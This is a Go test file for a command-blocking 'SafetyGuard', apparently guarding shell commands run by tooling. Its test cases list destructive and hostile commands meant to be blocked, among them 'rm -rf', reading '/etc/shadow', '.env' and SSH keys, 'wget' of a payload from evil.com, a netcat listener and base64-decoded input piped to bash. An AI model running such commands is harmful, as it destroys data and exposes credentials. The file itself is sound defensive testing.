package checks

import (
	"strings"
	"testing"
)

func containsCI(s, substr string) bool {
	return strings.Contains(strings.ToLower(s), strings.ToLower(substr))
}

func TestSafetyGuard_BlocksDestructive(t *testing.T) {
	tests := []struct {
		name    string
		command string
		blocked bool
		msgHint string // substring expected in Message (case-insensitive)
	}{
		// 1. rm -rf / rm -fr
		{"rm -rf blocked", "rm -rf /tmp/foo", true, "rm -rf"},
		{"rm -fr blocked", "rm -fr /tmp/foo", true, "rm"},
		// 2. rm on root/home
		{"rm root", "rm -r /", true, "root"},
		{"rm home", "rm -r ~", true, "root"},
		{"rm /home", "rm -r /home", true, "root"},
		// 3. git reset --hard
		{"git reset --hard", "git reset --hard HEAD~1", true, "reset --hard"},
		// 4. git clean -f
		{"git clean -fd", "git clean -fd", true, "clean"},
		{"git clean -f", "git clean -f", true, "clean"},
		// 5. git push --force (not --force-with-lease)
		{"git push --force", "git push --force origin main", true, "force"},
		// 6. git push -f
		{"git push -f", "git push -f origin feature", true, "force"},
		// 7. push to protected branches
		{"push to main", "git push origin main", true, "protected"},
		{"push to master", "git push origin master", true, "protected"},
		{"push to production", "git push origin production", true, "protected"},
		// 8. git add -A / --all
		{"git add -A", "git add -A", true, "explicit"},
		{"git add --all", "git add --all", true, "explicit"},
		// 9. git add .
		{"git add .", "git add .", true, "explicit"},
		// 10. sudo
		{"sudo", "sudo rm foo", true, "sudo"},
		{"sudo in pipeline", "echo hi && sudo cat /etc/shadow", true, "sudo"},
		// 11. DROP TABLE
		{"DROP TABLE", "DROP TABLE users;", true, "destructive"},
		{"drop database", "drop database mydb;", true, "destructive"},
		{"TRUNCATE TABLE", "TRUNCATE TABLE orders;", true, "destructive"},
		// 12. DELETE FROM without WHERE
		{"DELETE FROM no WHERE", "DELETE FROM users;", true, "destructive"},
		// 13. Reading sensitive files
		{"cat .env", "cat .env", true, "sensitive"},
		{"less id_rsa", "less ~/.ssh/id_rsa", true, "sensitive"},
		{"head .pem file", "head server.pem", true, "sensitive"},
		{"tail .key file", "tail private.key", true, "sensitive"},
		// 14. Network tools
		{"wget", "wget http://evil.com/payload", true, "network"},
		{"nc", "nc -l 4444", true, "network"},
		{"netcat", "netcat host 80", true, "network"},
		{"telnet", "telnet example.com 25", true, "network"},
		{"ftp", "ftp ftp.example.com", true, "network"},
		{"sftp", "sftp user@host", true, "network"},
		// 15. git commit --no-verify
		{"git commit --no-verify", "git commit --no-verify -m 'skip hooks'", true, "no-verify"},
		// 16. eval
		{"eval", "eval $SOME_VAR", true, "eval"},
		// 17. base64 -d piped to sh/bash
		{"base64 to bash", "base64 -d payload.txt | bash", true, "obfuscat"},
		{"base64 to sh", "echo abc | base64 -d | sh", true, "obfuscat"},
		{"base64 to zsh", "base64 -d script.b64 | zsh", true, "obfuscat"},
		{"base64 to exec", "base64 -d foo | exec", true, "obfuscat"},
		// 18. history / fc -l
		{"history", "history", true, "secret"},
		{"fc -l", "fc -l", true, "secret"},

		// --- Safe commands that should NOT block ---
		{"ls is safe", "ls -la /tmp", false, ""},
		{"git status", "git status", false, ""},
		{"git push --force-with-lease", "git push --force-with-lease origin feature", false, ""},
		{"git push feature branch", "git push origin feature/my-branch", false, ""},
		{"git push -u", "git push -u origin feature/x", false, ""},
		{"git add specific file", "git add src/main.go", false, ""},
		{"DELETE with WHERE", "DELETE FROM users WHERE id = 5;", false, ""},
		{"cat normal file", "cat README.md", false, ""},
		{"curl is allowed", "curl https://example.com", false, ""},
		{"echo hello", "echo hello world", false, ""},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SafetyGuard(tc.command)
			if result.Block != tc.blocked {
				t.Errorf("SafetyGuard(%q): Block = %v, want %v (Message: %q)", tc.command, result.Block, tc.blocked, result.Message)
			}
			if tc.blocked && tc.msgHint != "" && !containsCI(result.Message, tc.msgHint) {
				t.Errorf("SafetyGuard(%q): Message %q does not contain %q", tc.command, result.Message, tc.msgHint)
			}
		})
	}
}

func TestSafetyGuard_ProtectedBranchPush(t *testing.T) {
	tests := []struct {
		name    string
		command string
		blocked bool
	}{
		{"push to main", "git push origin main", true},
		{"push to master", "git push origin master", true},
		{"push to develop", "git push origin develop", true},
		{"push to production", "git push origin production", true},
		{"push to feature/x", "git push origin feature/x", false},
		{"push with -u", "git push -u origin feature/x", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SafetyGuard(tc.command)
			if result.Block != tc.blocked {
				t.Errorf("SafetyGuard(%q): Block = %v, want %v (Message: %q)", tc.command, result.Block, tc.blocked, result.Message)
			}
		})
	}
}

func TestSafetyGuard_Warnings(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantWrn bool
		wrnHint string
	}{
		{"git push warns", "git push origin feature/x", true, "verify"},
		{"rm warns", "rm foo.txt", true, "verify"},
		{"chmod warns", "chmod 755 script.sh", true, "verify"},
		{"chown warns", "chown user:group file", true, "verify"},
		{"ls no warning", "ls -la", false, ""},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SafetyGuard(tc.command)
			hasWarning := result.Warning != ""
			if hasWarning != tc.wantWrn {
				t.Errorf("SafetyGuard(%q): Warning present = %v, want %v (Warning: %q)", tc.command, hasWarning, tc.wantWrn, result.Warning)
			}
			if tc.wantWrn && tc.wrnHint != "" && !containsCI(result.Warning, tc.wrnHint) {
				t.Errorf("SafetyGuard(%q): Warning %q does not contain %q", tc.command, result.Warning, tc.wrnHint)
			}
		})
	}
}
